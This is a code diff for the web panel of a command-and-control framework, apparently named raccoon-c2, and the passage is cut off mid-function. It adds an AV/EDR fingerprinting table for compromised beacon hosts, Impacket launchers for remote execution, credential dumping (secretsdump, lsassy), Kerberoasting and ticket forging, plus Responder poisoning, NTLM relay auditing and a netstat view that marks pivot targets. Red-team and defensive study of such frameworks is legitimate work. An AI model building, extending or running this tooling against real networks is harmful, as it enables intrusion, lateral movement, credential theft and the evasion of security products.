+        <button onclick="runAvEnum()"><span class="ico">&#128737;</span> AV/EDR</button>
+        <button onclick="showNetstat()"><span class="ico">&#127760;</span> netstat</button>
         <button onclick="showBeaconConfig()"><span class="ico">&#9881;</span> Beacon</button>
         <button onclick="showPivotMap()"><span class="ico">&#127760;</span> Pivot Map</button>
-        <button onclick="showServerLog()"><span class="ico">&#128220;</span> Server Log</button>
+        <button onclick="showImpacketMenu(this)"><span class="ico">&#9876;</span> Impacket</button>
+        <button onclick="showLootViewer()"><span class="ico">&#128142;</span> Loot</button>
         <button onclick="showAgentLog()"><span class="ico">&#128196;</span> Agent Log</button>
         <button onclick="showHelp()"><span class="ico">&#10067;</span> Help</button>
       </div>
@@ -1497,10 +2063,65 @@ async function pollPanelResult(cmd, args, title){
   }
 }
 
-// ── Process listing with beacon highlight ──
+// ── Process listing with AV/EDR detection ──
+const EDR_DB = [
+  {re:/MsMpEng|MpCmdRun|NisSrv|SecurityHealthService|WinDefend/i, name:"Windows Defender", cat:"av", sev:"med"},
+  {re:/MsSense|SenseCncProxy|SenseIR/i, name:"Defender for Endpoint (EDR)", cat:"edr", sev:"high"},
+  {re:/cb\.exe|CbDefense|CbOsQueryExt|cbdaemon|cbagentd|CarbonBlack/i, name:"Carbon Black", cat:"edr", sev:"high"},
+  {re:/CrowdStrike|CSFalcon|csagent|falconhost|falcon-sensor|CSAgent/i, name:"CrowdStrike Falcon", cat:"edr", sev:"high"},
+  {re:/SentinelOne|SentinelAgent|sentinelctl|SentinelHelper/i, name:"SentinelOne", cat:"edr", sev:"high"},
+  {re:/cortex|traps|Traps|CyvrFsFlt|CyveraService|PanGPS/i, name:"Palo Alto Cortex XDR", cat:"edr", sev:"high"},
+  {re:/elastic-agent|elastic-endpoint|filebeat|metricbeat|winlogbeat/i, name:"Elastic EDR", cat:"edr", sev:"high"},
+  {re:/xagt|xagtnotif|FireEye|MandiantAgent|HXService/i, name:"Trellix/FireEye HX", cat:"edr", sev:"high"},
+  {re:/cylance|CylanceSvc|CyProtectDrv|CyOptics/i, name:"Cylance", cat:"edr", sev:"high"},
+  {re:/tanium|TaniumClient|TaniumCX/i, name:"Tanium", cat:"edr", sev:"high"},
+  {re:/qualys|QualysAgent/i, name:"Qualys", cat:"edr", sev:"med"},
+  {re:/rapid7|ir_agent/i, name:"Rapid7 InsightAgent", cat:"edr", sev:"high"},
+  {re:/LTSvc|LTTray|ScreenConnect|ConnectWise/i, name:"ConnectWise/ScreenConnect", cat:"rmm", sev:"med"},
+  {re:/kavp|avp\.exe|avpui|KES\w/i, name:"Kaspersky", cat:"av", sev:"high"},
+  {re:/bdagent|vsserv|EPSecurityService|bdntwrk/i, name:"Bitdefender", cat:"av", sev:"med"},
+  {re:/savservice|SophosAgent|SophosClean|SophosMTR|hmpalert|sophos/i, name:"Sophos", cat:"edr", sev:"high"},
+  {re:/mcshield|McAfee|masvc|mfemms|mfefire|mfevtps/i, name:"McAfee/Trellix", cat:"av", sev:"med"},
+  {re:/eset_nod|ekrn|egui|ERAAgent/i, name:"ESET", cat:"av", sev:"med"},
+  {re:/avast|AvastSvc|aswEngSrv|aswToolsSvc/i, name:"Avast", cat:"av", sev:"low"},
+  {re:/avgnt|avguard|AVGSvc/i, name:"AVG", cat:"av", sev:"low"},
+  {re:/f-secure|fshoster|fsav|fsdevcon|WithSecure/i, name:"WithSecure/F-Secure", cat:"av", sev:"med"},
+  {re:/symantec|ccSvcHst|Rtvscan|SepMasterService|smc\.exe|SEP\w/i, name:"Symantec SEP", cat:"av", sev:"med"},
+  {re:/splunkd|splunk-|SplunkForwarder/i, name:"Splunk (SIEM)", cat:"siem", sev:"high"},
+  {re:/ossec|wazuh/i, name:"Wazuh/OSSEC", cat:"siem", sev:"high"},
+  {re:/snort|suricata/i, name:"Snort/Suricata (IDS)", cat:"ids", sev:"high"},
+  {re:/auditd|auditctl|aureport/i, name:"Linux Audit", cat:"audit", sev:"med"},
+  {re:/osquery/i, name:"osquery", cat:"audit", sev:"med"},
+  {re:/sysmon|Sysmon64/i, name:"Sysmon", cat:"audit", sev:"high"},
+  {re:/logrhythm|LogRhythm/i, name:"LogRhythm (SIEM)", cat:"siem", sev:"high"},
+  {re:/nessus|nessusd/i, name:"Nessus Scanner", cat:"scanner", sev:"med"},
+  {re:/clamd|clamscan|freshclam/i, name:"ClamAV", cat:"av", sev:"low"},
+  {re:/WireShark|dumpcap|tshark/i, name:"Wireshark (Capture)", cat:"forensic", sev:"med"},
+  {re:/velociraptor/i, name:"Velociraptor (DFIR)", cat:"forensic", sev:"high"},
+  {re:/GRR|grr_agent/i, name:"GRR (DFIR)", cat:"forensic", sev:"high"},
+];
+
+const EDR_CAT_LABELS = {
+  edr:"EDR", av:"AV", siem:"SIEM", ids:"IDS/IPS", audit:"Audit",
+  scanner:"Scanner", forensic:"DFIR", rmm:"RMM"
+};
+const EDR_SEV_COLORS = {
+  high:{bg:"rgba(255,50,50,0.15)",fg:"#ff5555"},
+  med:{bg:"rgba(255,165,0,0.12)",fg:"#ffaa33"},
+  low:{bg:"rgba(255,215,0,0.1)",fg:"#ffd700"}
+};
+
+function detectEDR(line){
+  const hits = [];
+  for(const e of EDR_DB){
+    if(e.re.test(line)) hits.push(e);
+  }
+  return hits;
+}
+
 async function showProcs(){
   if(!selectedAgent) return;
-  const procsCmd = 'ps aux 2>/dev/null || tasklist';
+  const procsCmd = 'ps aux 2>/dev/null || tasklist /v';
   await api("/api/agents/"+selectedAgent+"/task",{
     method:"POST", body:JSON.stringify({cmd:"shell", args:procsCmd, data:""})
   });
@@ -1523,15 +2144,522 @@ async function pollProcsResult(procsCmd){
   const info = await api("/api/agents/"+selectedAgent);
   const pid = info && info.pid ? String(info.pid) : null;
   const lines = (last.output||"").split("\n");
-  let html = '<div class="t-output">';
+
+  const detectedTools = new Map();
+  const flaggedLines = [];
+  let beaconLine = null;
+
   for(const line of lines){
-    if(pid && line.match(new RegExp("(^|\\s)"+pid+"(\\s|$)"))){
-      html += '<span style="color:#FFD700;font-weight:bold">'+esc(line)+' [BEACON]</span>\n';
-    } else {
-      html += esc(line)+'\n';
+    if(!line.trim()) continue;
+    const isBeacon = pid && line.match(new RegExp("(^|\\s)"+pid+"(\\s|$)"));
+    const hits = detectEDR(line);
+    if(isBeacon) beaconLine = line;
+    hits.forEach(h => { if(!detectedTools.has(h.name)) detectedTools.set(h.name, h); });
+    flaggedLines.push({line, isBeacon, hits});
+  }
+
+  let html = '';
+  if(detectedTools.size > 0 || beaconLine){
+    html += '<div class="proc-summary">';
+    if(detectedTools.size > 0){
+      html += '<div class="proc-alert"><span class="proc-alert-ico">🛡️</span><span class="proc-alert-title">Security Tools Detected ('+detectedTools.size+')</span></div>';
+      html += '<div class="proc-detections">';
+      for(const [name, e] of detectedTools){
+        const sc = EDR_SEV_COLORS[e.sev];
+        const catLabel = EDR_CAT_LABELS[e.cat]||e.cat;
+        html += '<div class="proc-det" style="border-left:3px solid '+sc.fg+'">'
+          +'<span class="proc-det-name">'+esc(name)+'</span>'
+          +'<span class="proc-det-tag" style="background:'+sc.bg+';color:'+sc.fg+'">'+catLabel+'</span>'
+          +'<span class="proc-det-sev" style="color:'+sc.fg+'">'+e.sev+'</span>'
+          +'</div>';
+      }
+      html += '</div>';
     }
+    if(beaconLine){
+      html += '<div class="proc-beacon-info">🦝 Beacon PID '+esc(pid)+' found in process list</div>';
+    }
+    html += '</div>';
+  }
+
+  html += '<div class="proc-list">';
+  const headerLine = flaggedLines.length > 0 && /^\s*(USER|PID|Image Name|%CPU|Name)/i.test(flaggedLines[0].line);
+  for(let i=0; i<flaggedLines.length; i++){
+    const {line, isBeacon, hits} = flaggedLines[i];
+    if(i===0 && headerLine){
+      html += '<div class="proc-line proc-header">'+esc(line)+'</div>';
+      continue;
+    }
+    let cls = "proc-line";
+    let suffix = "";
+    if(isBeacon){ cls += " proc-beacon"; suffix = ' <span class="proc-tag beacon">BEACON</span>'; }
+    if(hits.length){
+      cls += " proc-flagged";
+      suffix += hits.map(h => {
+        const sc = EDR_SEV_COLORS[h.sev];
+        return ' <span class="proc-tag" style="background:'+sc.bg+';color:'+sc.fg+'">'+esc(h.name)+'</span>';
+      }).join("");
+    }
+    html += '<div class="'+cls+'">'+esc(line)+suffix+'</div>';
   }
   html += '</div>';
+  body.innerHTML = html;
+}
+
+// ── AV/EDR enumeration ──
+function runAvEnum(){
+  showAvEnumDialog();
+}
+
+// ── Impacket menu ──
+function showImpacketMenu(btn){
+  let menu = document.getElementById("ipk-menu");
+  if(menu){ menu.remove(); return; }
+  menu = document.createElement("div");
+  menu.id = "ipk-menu";
+  menu.className = "nxc-menu";
+  let html = '<div class="nxc-title">Impacket Tools</div>';
+  html += '<div class="nxc-section">Target</div>';
+  html += '<div class="nxc-host-pick">';
+  html += '<input id="ipk-target" placeholder="IP or hostname" style="width:100%;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
+  html += '</div>';
+  html += '<div class="nxc-host-pick" style="display:flex;gap:4px">';
+  html += '<input id="ipk-user" placeholder="user" style="flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
+  html += '<input id="ipk-pass" placeholder="pass / hash" type="password" style="flex:1;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px">';
+  html += '</div>';
+  html += '<div class="nxc-host-pick"><label style="font-size:10px;color:var(--text2)"><input type="checkbox" id="ipk-hash"> Pass-the-Hash (-hashes)</label></div>';
+  html += '<div class="nxc-section">Execution</div>';
+  html += '<button onclick="ipkRun(\'psexec\')">PsExec (SYSTEM shell)</button>';
+  html += '<button onclick="ipkRun(\'wmiexec\')">WMIExec (stealthier)</button>';
+  html += '<button onclick="ipkRun(\'smbexec\')">SMBExec (no binary drop)</button>';
+  html += '<button onclick="ipkRun(\'atexec\')">AtExec (scheduled task)</button>';
+  html += '<button onclick="ipkRun(\'dcomexec\')">DcomExec (DCOM lateral)</button>';
+  html += '<div class="nxc-section">Credential Dumping</div>';
+  html += '<button onclick="ipkRun(\'secretsdump\')">SecretsDump (SAM/LSA/NTDS)</button>';
+  html += '<button onclick="ipkRun(\'lsassy\')">Lsassy (LSASS remote)</button>';
+  html += '<div class="nxc-section">Enumeration</div>';
+  html += '<button onclick="ipkRun(\'samrdump\')">SAMRDump (users/groups)</button>';
+  html += '<button onclick="ipkRun(\'lookupsid\')">LookupSID (SID enum)</button>';
+  html += '<button onclick="ipkRun(\'reg\')">Reg.py (remote registry)</button>';
+  html += '<button onclick="ipkRun(\'GetADUsers\')">GetADUsers</button>';
+  html += '<button onclick="ipkRun(\'GetUserSPNs\')">GetUserSPNs (Kerberoast)</button>';
+  html += '<button onclick="ipkRun(\'GetNPUsers\')">GetNPUsers (AS-REP roast)</button>';
+  html += '<div class="nxc-section">Relay & Coercion</div>';
+  html += '<button onclick="showRelayKingDialog()">👑 RelayKing (relay audit)</button>';
+  html += '<button onclick="showResponderDialog()">📡 Responder (poison)</button>';
+  html += '<button onclick="ipkRun(\'ntlmrelayx\')">NTLMRelayx</button>';
+  html += '<button onclick="ipkRun(\'smbserver\')">SMBServer (share files)</button>';
+  html += '<button onclick="ipkRun(\'ticketer\')">Ticketer (golden/silver)</button>';
+  html += '<div class="nxc-section">Custom</div>';
+  html += '<div class="nxc-custom"><input id="ipk-custom" placeholder="e.g. secretsdump.py domain/user:pass@target" style="width:100%"><button onclick="ipkCustomRun()">Run</button></div>';
+  html += '<div class="nxc-note">Runs on C2 server (not beacon). Requires Docker container.</div>';
+  menu.innerHTML = html;
+  btn.parentElement.style.position = "relative";
+  btn.parentElement.appendChild(menu);
+  document.addEventListener("click", function closeIpk(e){
+    if(!e.target.closest("#ipk-menu") && !e.target.closest("[onclick*=showImpacketMenu]")){
+      const m = document.getElementById("ipk-menu");
+      if(m) m.remove();
+      document.removeEventListener("click", closeIpk);
+    }
+  });
+}
+
+function ipkBuildAuth(){
+  const user = document.getElementById("ipk-user")?.value?.trim() || "";
+  const pass = document.getElementById("ipk-pass")?.value?.trim() || "";
+  const isHash = document.getElementById("ipk-hash")?.checked;
+  if(!user) return "";
+  if(isHash && pass) return user + " -hashes :" + pass;
+  if(pass) return user + ":" + pass;
+  return user;
+}
+
+async function ipkRun(tool){
+  const target = document.getElementById("ipk-target")?.value?.trim();
+  if(!target){ toast("warn","Impacket","Enter target IP/hostname",3000); return; }
+  const auth = ipkBuildAuth();
+  document.getElementById("ipk-menu")?.remove();
+
+  const cmdMap = {
+    psexec: "impacket-psexec",
+    wmiexec: "impacket-wmiexec",
+    smbexec: "impacket-smbexec",
+    atexec: "impacket-atexec",
+    dcomexec: "impacket-dcomexec",
+    secretsdump: "impacket-secretsdump",
+    lsassy: "lsassy",
+    samrdump: "impacket-samrdump",
+    lookupsid: "impacket-lookupsid",
+    reg: "impacket-reg",
+    GetADUsers: "impacket-GetADUsers",
+    GetUserSPNs: "impacket-GetUserSPNs",
+    GetNPUsers: "impacket-GetNPUsers",
+    ntlmrelayx: "impacket-ntlmrelayx",
+    smbserver: "impacket-smbserver SHARE /tmp/share",
+    ticketer: "impacket-ticketer",
+  };
+  const binary = cmdMap[tool] || "impacket-"+tool;
+  const fullCmd = auth ? binary + " " + auth + "@" + target : binary + " " + target;
+  toast("info","Impacket","Running: "+tool+" → "+target,4000);
+  await api("/api/server/exec", {
+    method:"POST",
+    body:JSON.stringify({cmd: fullCmd, tool: tool})
+  });
+  openPanel("Impacket: "+tool, '<div class="t-pending">Running '+esc(tool)+' against '+esc(target)+'...</div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollServerExec(tool), 2000);
+}
+
+function ipkCustomRun(){
+  const args = document.getElementById("ipk-custom")?.value?.trim();
+  if(!args){ toast("warn","Impacket","Enter command",3000); return; }
+  document.getElementById("ipk-menu")?.remove();
+  toast("info","Impacket","Running: "+args,4000);
+  api("/api/server/exec", {
+    method:"POST",
+    body:JSON.stringify({cmd: args, tool: "custom"})
+  });
+  openPanel("Impacket: custom", '<div class="t-pending">Running command...</div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollServerExec("custom"), 2000);
+}
+
+async function pollServerExec(tool){
+  const result = await api("/api/server/exec/result");
+  if(!result || result.status === "running") return;
+  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
+  const body = document.getElementById("panel-body");
+  if(!body) return;
+  if(result.status === "ok"){
+    body.innerHTML = '<div class="t-output">'+esc(result.output||"(no output)")+'</div>';
+  } else {
+    body.innerHTML = '<div class="t-error">'+esc(result.output||"(error)")+'</div>';
+  }
+}
+
+// ── AV/EDR Remote Enum (server-side via Impacket) ──
+function showAvEnumDialog(){
+  document.getElementById("nxc-menu")?.remove();
+  document.getElementById("ipk-menu")?.remove();
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.style.minWidth = "360px";
+  panel.innerHTML = '<h2>🛡️ Remote AV/EDR Enumeration</h2>'
+    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
+    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Scans a remote host via SMB using Impacket — detects installed AV/EDR via LsarLookupNames (unprivileged), named pipes, and SCM.</p>'
+    +'<div class="avenum-form">'
+    +'<label>Target <input id="ave-target" placeholder="10.0.0.5"></label>'
+    +'<label>Domain <input id="ave-domain" placeholder="." value="."></label>'
+    +'<label>Username <input id="ave-user" placeholder="guest"></label>'
+    +'<label>Password / Hash <input id="ave-pass" type="password" placeholder="(empty for null session)"></label>'
+    +'<label class="ave-check"><input type="checkbox" id="ave-hash"> Pass-the-Hash (NTLM hash)</label>'
+    +'<button class="ave-run" onclick="runAvEnumRemote()">🛡️ Scan</button>'
+    +'</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+}
+
+async function runAvEnumRemote(){
+  const target = document.getElementById("ave-target")?.value?.trim();
+  if(!target){ toast("warn","AV Enum","Enter target IP/hostname",3000); return; }
+  const domain = document.getElementById("ave-domain")?.value?.trim() || ".";
+  const user = document.getElementById("ave-user")?.value?.trim() || "";
+  const pass = document.getElementById("ave-pass")?.value || "";
+  const useHash = document.getElementById("ave-hash")?.checked || false;
+  document.querySelector(".loot-overlay")?.remove();
+  toast("info","AV Enum","Scanning "+target+"...",4000);
+  await api("/api/server/avenum", {
+    method:"POST",
+    body:JSON.stringify({target, username:user, password:pass, domain, use_hash:useHash})
+  });
+  openPanel("AV/EDR: "+target, '<div class="t-pending">Enumerating endpoint protection on '+esc(target)+'...</div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollServerExec("avenum"), 2000);
+}
+
+// ── RelayKing dialog ──
+function showRelayKingDialog(){
+  document.getElementById("ipk-menu")?.remove();
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.style.minWidth = "420px";
+  panel.innerHTML = '<h2>👑 RelayKing — NTLM Relay Audit</h2>'
+    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
+    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Scans for NTLM relay opportunities across SMB, LDAP, HTTP, MSSQL. Identifies signing, EPA, channel binding, Ghost SPNs, NTLMv1.</p>'
+    +'<div class="avenum-form">'
+    +'<label>Target(s) <input id="rk-target" placeholder="10.0.0.0/24, hostname, or IP range"></label>'
+    +'<label>Domain <input id="rk-domain" placeholder="domain.local"></label>'
+    +'<label>DC IP <input id="rk-dcip" placeholder="(for --audit / Kerberos)"></label>'
+    +'<div style="display:flex;gap:8px">'
+    +'<label style="flex:1">Username <input id="rk-user" placeholder="user"></label>'
+    +'<label style="flex:1">Password <input id="rk-pass" type="password" placeholder="pass"></label>'
+    +'</div>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Protocols</div>'
+    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
+    +'<label class="ave-check"><input type="checkbox" id="rk-smb" checked> SMB</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-ldap" checked> LDAP</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-ldaps" checked> LDAPS</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-http"> HTTP</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-https"> HTTPS</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-mssql"> MSSQL</label>'
+    +'</div>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Options</div>'
+    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
+    +'<label class="ave-check"><input type="checkbox" id="rk-audit"> --audit (all AD computers)</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-portscan"> --proto-portscan</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-ntlmv1"> --ntlmv1</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-genrelay" checked> --gen-relay-list</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rk-coerce"> --coerce-all</label>'
+    +'</div>'
+    +'<label>Threads <input id="rk-threads" value="10" style="width:60px"></label>'
+    +'<label>Extra args <input id="rk-extra" placeholder="e.g. -vv --no-ghosts"></label>'
+    +'<button class="ave-run" onclick="runRelayKing()">👑 Run RelayKing</button>'
+    +'</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+}
+
+async function runRelayKing(){
+  const target = document.getElementById("rk-target")?.value?.trim();
+  const domain = document.getElementById("rk-domain")?.value?.trim();
+  const dcip = document.getElementById("rk-dcip")?.value?.trim();
+  const user = document.getElementById("rk-user")?.value?.trim();
+  const pass = document.getElementById("rk-pass")?.value;
+  const threads = document.getElementById("rk-threads")?.value?.trim() || "10";
+  const extra = document.getElementById("rk-extra")?.value?.trim() || "";
+  const audit = document.getElementById("rk-audit")?.checked;
+
+  if(!target && !audit){ toast("warn","RelayKing","Enter target or enable --audit",3000); return; }
+
+  const protos = [];
+  if(document.getElementById("rk-smb")?.checked) protos.push("smb");
+  if(document.getElementById("rk-ldap")?.checked) protos.push("ldap");
+  if(document.getElementById("rk-ldaps")?.checked) protos.push("ldaps");
+  if(document.getElementById("rk-http")?.checked) protos.push("http");
+  if(document.getElementById("rk-https")?.checked) protos.push("https");
+  if(document.getElementById("rk-mssql")?.checked) protos.push("mssql");
+
+  let cmd = "python3 /opt/RelayKing/relayking.py";
+  if(user) cmd += " -u " + user;
+  if(pass) cmd += " -p '" + pass.replace(/'/g,"'\\''") + "'";
+  if(domain) cmd += " -d " + domain;
+  if(dcip) cmd += " --dc-ip " + dcip;
+  if(!user && !pass) cmd += " --null-auth";
+  if(protos.length) cmd += " --protocols " + protos.join(",");
+  cmd += " --threads " + threads;
+  if(audit) cmd += " --audit";
+  if(document.getElementById("rk-portscan")?.checked) cmd += " --proto-portscan";
+  if(document.getElementById("rk-ntlmv1")?.checked) cmd += " --ntlmv1";
+  if(document.getElementById("rk-genrelay")?.checked) cmd += " --gen-relay-list /data/raccoon-c2/relay-targets.txt";
+  if(document.getElementById("rk-coerce")?.checked) cmd += " --coerce-all";
+  cmd += " -o plaintext";
+  if(extra) cmd += " " + extra;
+  if(target) cmd += " " + target;
+
+  document.querySelector(".loot-overlay")?.remove();
+  toast("info","RelayKing","Scanning for relay opportunities...",5000);
+  await api("/api/server/exec", {
+    method:"POST",
+    body:JSON.stringify({cmd, tool:"relayking"})
+  });
+  openPanel("RelayKing", '<div class="t-pending">Running RelayKing relay audit...<br><span style="font-size:10px;color:var(--text2)">This may take several minutes for large subnets.</span></div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollServerExec("relayking"), 3000);
+}
+
+// ── Responder dialog ──
+function showResponderDialog(){
+  document.getElementById("ipk-menu")?.remove();
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.style.minWidth = "400px";
+  panel.innerHTML = '<h2>📡 Responder — LLMNR/NBT-NS/mDNS Poisoner</h2>'
+    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
+    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Poisons LLMNR, NBT-NS, and mDNS to capture Net-NTLM hashes. Use Analyze mode (-A) first to observe traffic without poisoning.</p>'
+    +'<div class="avenum-form">'
+    +'<label>Interface <input id="rsp-iface" placeholder="eth0" value="eth0"></label>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Mode</div>'
+    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
+    +'<label class="ave-check"><input type="radio" name="rsp-mode" value="analyze" checked> Analyze (-A, passive)</label>'
+    +'<label class="ave-check"><input type="radio" name="rsp-mode" value="poison"> Poison (active)</label>'
+    +'</div>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Options</div>'
+    +'<div style="display:flex;gap:8px;flex-wrap:wrap;font-size:11px">'
+    +'<label class="ave-check"><input type="checkbox" id="rsp-wpad"> WPAD proxy (-w)</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rsp-force-wpad"> Force WPAD auth (-F)</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rsp-verbose"> Verbose (-v)</label>'
+    +'</div>'
+    +'<label>Extra args <input id="rsp-extra" placeholder="e.g. --lm --disable-ess"></label>'
+    +'<button class="ave-run" onclick="runResponder()">📡 Start Responder</button>'
+    +'<div class="nxc-note" style="margin-top:8px">⚠ Poison mode will actively intercept network traffic. Use Analyze first. Requires host networking (--net=host).</div>'
+    +'</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+}
+
+async function runResponder(){
+  const iface = document.getElementById("rsp-iface")?.value?.trim() || "eth0";
+  const mode = document.querySelector('input[name="rsp-mode"]:checked')?.value || "analyze";
+  const extra = document.getElementById("rsp-extra")?.value?.trim() || "";
+
+  let cmd = "python3 /opt/Responder/Responder.py -I " + iface;
+  if(mode === "analyze") cmd += " -A";
+  if(document.getElementById("rsp-wpad")?.checked) cmd += " -w";
+  if(document.getElementById("rsp-force-wpad")?.checked) cmd += " -F";
+  if(document.getElementById("rsp-verbose")?.checked) cmd += " -v";
+  if(extra) cmd += " " + extra;
+
+  document.querySelector(".loot-overlay")?.remove();
+  toast("info","Responder","Starting in " + mode + " mode on " + iface,4000);
+  await api("/api/server/exec", {
+    method:"POST",
+    body:JSON.stringify({cmd, tool:"responder"})
+  });
+  openPanel("Responder ("+mode+")", '<div class="t-pending">Responder running in '+esc(mode)+' mode on '+esc(iface)+'...<br><span style="font-size:10px;color:var(--text2)">Capturing hashes... Poll results below.</span></div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollServerExec("responder"), 3000);
+}
+
+// ── Netstat view ──
+const NET_SERVICES = {
+  21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",67:"DHCP",68:"DHCP",
+  80:"HTTP",110:"POP3",111:"RPC",135:"MSRPC",137:"NetBIOS",138:"NetBIOS",
+  139:"SMB",143:"IMAP",161:"SNMP",389:"LDAP",443:"HTTPS",445:"SMB",
+  465:"SMTPS",514:"Syslog",515:"LPD",587:"SMTP",631:"CUPS",636:"LDAPS",
+  993:"IMAPS",995:"POP3S",1080:"SOCKS",1433:"MSSQL",1521:"Oracle",
+  2049:"NFS",3306:"MySQL",3389:"RDP",5432:"Postgres",5900:"VNC",
+  5985:"WinRM",5986:"WinRM-S",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",
+  8888:"HTTP-Alt",9200:"Elastic",9300:"Elastic",27017:"MongoDB",
+};
+const NET_SUSPICIOUS = new Set([
+  4444,5555,1234,31337,9999,6666,6667,6697,7777,8000,
+  4443,2222,1337,13337,43,50050,
+]);
+const NET_INTEREST = {
+  22:"highlight",23:"warn",135:"warn",139:"warn",445:"warn",
+  3389:"highlight",5900:"highlight",5985:"highlight",5986:"highlight",
+  1433:"highlight",3306:"highlight",5432:"highlight",6379:"highlight",
+  389:"highlight",636:"highlight",
+};
+
+function parseNetstat(raw){
+  const rows = [];
+  const lines = raw.split("\n");
+  for(const line of lines){
+    const trimmed = line.trim();
+    if(!trimmed || /^(Active|Proto|----)/.test(trimmed)) continue;
+    // Linux: tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1234/sshd
+    let m = trimmed.match(/^(tcp6?|udp6?)\s+\d+\s+\d+\s+(\S+)\s+(\S+)\s+(\S+)(?:\s+(\S+))?/);
+    if(m){
+      rows.push({proto:m[1],local:m[2],remote:m[3],state:m[4],proc:m[5]||""});
+      continue;
+    }
+    // Windows: TCP 0.0.0.0:445 0.0.0.0:0 LISTENING
+    m = trimmed.match(/^(TCP|UDP)\s+(\S+)\s+(\S+)\s+(\S+)/i);
+    if(m){
+      rows.push({proto:m[1].toLowerCase(),local:m[2],remote:m[3],state:m[4],proc:""});
+    }
+  }
+  return rows;
+}
+
+function extractPort(addr){
+  if(!addr) return null;
+  const i = addr.lastIndexOf(":");
+  if(i<0) return null;
+  const p = parseInt(addr.substring(i+1),10);
+  return isNaN(p)?null:p;
+}
+
+function assessConn(row){
+  const lport = extractPort(row.local);
+  const rport = extractPort(row.remote);
+  const tags = [];
+  if(lport && NET_SERVICES[lport]) tags.push({text:NET_SERVICES[lport],cls:"svc"});
+  if(rport && NET_SERVICES[rport]) tags.push({text:NET_SERVICES[rport],cls:"svc"});
+  if(lport && NET_SUSPICIOUS.has(lport)) tags.push({text:"⚠ suspicious port",cls:"warn"});
+  if(rport && NET_SUSPICIOUS.has(rport)) tags.push({text:"⚠ suspicious port",cls:"warn"});
+  const interest = (lport && NET_INTEREST[lport]) || (rport && NET_INTEREST[rport]);
+  if(interest) tags.push({text: interest==="warn"?"attack surface":"pivot target",cls:interest});
+  if(row.state && /ESTABLISHED/i.test(row.state)){
+    const r = row.remote.replace(/:\d+$/,"");
+    if(r && r!=="0.0.0.0" && r!=="*" && r!=="::" && !r.startsWith("127."))
+      tags.push({text:"active",cls:"active"});
+  }
+  if(/LISTEN/i.test(row.state)) tags.push({text:"listening",cls:"listen"});
+  return tags;
+}
+
+async function showNetstat(){
+  if(!selectedAgent) return;
+  const cmd = 'netstat -tlnp 2>/dev/null || netstat -an';
+  await api("/api/agents/"+selectedAgent+"/task",{
+    method:"POST", body:JSON.stringify({cmd:"shell", args:cmd, data:""})
+  });
+  openPanel("Network", '<div class="t-pending">Waiting for agent...</div>');
+  if(panelPollTimer) clearInterval(panelPollTimer);
+  panelPollTimer = setInterval(() => pollNetstatResult(cmd), 1500);
+  pollHistory(selectedAgent);
+}
+
+async function pollNetstatResult(cmd){
+  if(!selectedAgent) return;
+  const hist = await api("/api/agents/"+selectedAgent+"/history");
+  const matches = hist.filter(h => h.cmd==="shell" && h.args===cmd);
+  const last = matches[matches.length-1];
+  if(!last || last.status==="pending" || last.status===null) return;
+  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
+  const body = document.getElementById("panel-body");
+  if(!body) return;
+  if(last.status!=="ok"){ body.innerHTML='<div class="t-error">'+esc(last.output||"(error)")+'</div>'; return; }
+  const rows = parseNetstat(last.output||"");
